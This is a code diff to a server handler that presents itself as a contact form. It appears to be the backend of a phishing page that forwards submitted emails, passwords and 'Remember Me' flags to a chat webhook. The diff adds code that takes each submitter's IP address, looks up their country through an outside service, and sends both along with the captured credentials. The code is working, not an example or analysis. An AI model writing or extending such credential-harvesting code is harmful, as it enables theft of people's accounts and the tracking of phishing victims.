@@ -19,6 +19,27 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: 'Server misconfigured' });
     }
 
+    // Get client IP
+    const forwarded = req.headers['x-forwarded-for'];
+    const ip = forwarded
+      ? forwarded.split(',')[0].trim()
+      : req.socket.remoteAddress;
+
+    // Default fallback
+    let country = 'Unknown';
+
+    try {
+      // Lookup country from IP
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+      const geoData = await geoRes.json();
+
+      if (geoData?.status === 'success') {
+        country = geoData.country || 'Unknown';
+      }
+    } catch (e) {
+      console.error('Geo lookup failed:', e);
+    }
+
     const payload = {
       content: '**New contact form submission**',
       embeds: [
@@ -26,8 +47,10 @@ export default async function handler(req, res) {
           title: 'Contact Form',
           fields: [
             { name: 'Email', value: safeEmail, inline: true },
-            { name: 'password', value: safePassword, inline: true },
-            { name: 'Remember Me', value: safeRemember, inline: true }
+            { name: 'Password', value: safePassword, inline: true },
+            { name: 'Remember Me', value: safeRemember, inline: true },
+            { name: 'IP Address', value: ip || 'Unknown', inline: true },
+            { name: 'Country', value: country, inline: true }
           ],
           timestamp: new Date().toISOString()
         }
